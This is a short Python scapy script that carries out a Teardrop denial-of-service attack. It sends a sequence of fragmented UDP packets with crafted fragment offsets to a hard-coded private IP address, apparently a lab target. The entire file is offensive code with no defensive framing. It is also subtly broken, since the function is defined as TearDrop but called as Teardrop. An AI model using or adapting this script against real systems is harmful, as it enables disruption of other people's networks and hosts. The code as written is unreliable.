#!/usr/bin/env python
import sys
from scapy.all import *
def TearDrop(Ip):
    print("The teardrop attack is initiating %s" %Ip)
    size=800
    offset=3
    load="\x00"*size
    i=IP()/UDP(dport=80)
    i.dst=Ip
    i.flags="MF"
    i.proto=17 # UDP
    send(i/load)

    for k in range(10):
        i.frag=offset
        offset+=20
        send(i/load)

    i.flags=0
    i.frag=offset
    send(i/load)


Teardrop(Ip = "10.0.2.8")
